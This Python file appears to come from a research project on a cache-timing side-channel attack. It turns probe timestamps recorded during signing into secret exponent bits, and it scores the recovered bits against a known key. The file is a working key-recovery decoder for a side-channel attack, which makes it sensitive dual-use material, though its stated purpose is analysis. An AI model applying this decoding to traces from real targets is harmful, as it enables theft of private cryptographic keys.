"""The whole attack, in the shape of the pseudocode in README/EXPLANATION.

decoder.py is the implementation the rest of the analysis imports; it carries
the extra bookkeeping those callers need (latencies, narrow gaps, alternation
rates, forward-order truth, plotting hooks). This file is the same arithmetic
with all of that removed, so the four steps are the only thing on the page:

    1. trim to the dense region where signing happens
    2. split accesses into per-iteration pairs, keep the wide ones
    3. index them by dividing through the median iteration time
    4. call the bit 1 where the pair's gap is above the median gap

It is checked against decoder.py by test_recover.py -- the two agree bit for
bit. Depends only on numpy.

    python3 recover.py ../data/traces/r0.out
"""
import gzip
import sys

import numpy as np

# Splits the two gap scales. Every observed gap is either < 35,000 or
# > 270,000 cycles, so this is read off the data, not tuned.
PAIR_SPLIT_CYCLES = 100_000


def load(path):
    """Timestamps of the probed line's accesses, sorted.

    One line per probe record, whitespace-separated "tsc:latency" columns.
    The watched line is the last column; latency is not used past this point.
    """
    opener = gzip.open if str(path).endswith(".gz") else open
    with opener(path, "rt") as fh:
        ts = [int(line.split()[-1].split(":")[0]) for line in fh if line.split()]
    return np.sort(np.array([t for t in ts if t > 0], dtype=np.int64))


def recover(ts, n_bits, anchor=0):
    """Exponent bits from one trace. Returns (bit_index, bit_value), LSB-first.

    bit_index[k] is which exponent bit bit_value[k] is a guess for; iterations
    whose pair the probe missed are simply absent, which is why the indices
    are returned rather than a dense array.
    """
    # 1. the probe runs a fixed cycle budget, so the tail is post-signing idle
    hist, edges = np.histogram(ts, bins=40)
    keep = np.where(hist >= 0.25 * hist.max())[0]
    ts = ts[(ts >= edges[keep[0]]) & (ts <= edges[keep[-1] + 1])]

    # 2. accesses cluster into pairs; split at the long inter-iteration gaps
    starts = np.concatenate(([0], np.where(np.diff(ts) >= PAIR_SPLIT_CYCLES)[0] + 1))
    ends = np.concatenate((starts[1:] - 1, [len(ts) - 1]))
    pair = (ends - starts) == 1                      # keep clusters of exactly 2
    start_t = ts[starts[pair]].astype(float)
    gap = (ts[ends[pair]] - ts[starts[pair]]).astype(float)

    wide = gap > np.median(gap)                      # the SELECTs
    start_t, gap = start_t[wide], gap[wide]

    # 3. one wide pair per loop iteration, so median spacing is the period.
    #    A global line, not a running count: a missed iteration then costs its
    #    own bit instead of shifting every bit after it.
    period = np.median(np.diff(start_t))
    idx = np.round((start_t - start_t[0]) / period).astype(int)
    idx += anchor - idx.min()

    ok = (idx >= 0) & (idx < n_bits)
    idx, gap = idx[ok], gap[ok]

    # 4. longer SELECT = bit set
    return idx, (gap > np.median(gap)).astype(int)


if __name__ == "__main__":
    import decoder as D                              # only for the key + anchor

    path = sys.argv[1]
    key_id = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    lsb_first, _ = D.load_exponent(key_id)

    best = max(
        (float((b == lsb_first[i]).mean()), a, i, b)
        for a in range(-2, 3)
        for i, b in [recover(load(path), len(lsb_first), anchor=a)]
        if len(i)
    )
    acc, anchor, idx, bit = best
    print(f"{path}: {len(idx)} bits recovered, anchor {anchor:+d}, accuracy {acc:.4f}")
